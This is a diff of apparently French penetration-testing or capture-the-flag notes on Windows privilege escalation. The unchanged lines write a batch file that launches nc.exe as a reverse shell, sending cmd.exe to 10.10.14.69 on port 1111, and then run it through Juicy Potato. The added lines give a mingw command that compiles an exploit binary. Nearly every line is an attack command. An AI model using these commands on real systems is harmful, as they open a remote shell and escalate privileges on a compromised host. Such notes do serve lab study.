@@ -109,3 +109,6 @@ créer un .bat reverse shell:
 echo START C:\inetpub\wwwroot\wordpress\wp-content\nc.exe 10.10.14.69 1111 -e cmd.exe > reverse_shell.bat  
 Puis l'exécuter avec Juicy Potato  
 PS.exe -t * -p C:\inetpub\wwwroot\wordpress\wp-content\reverse_shell.bat -l 1337  
+
+### Compiler binaire
+x86_64-w64-mingw32-gcc file.c -o eploit.exe  
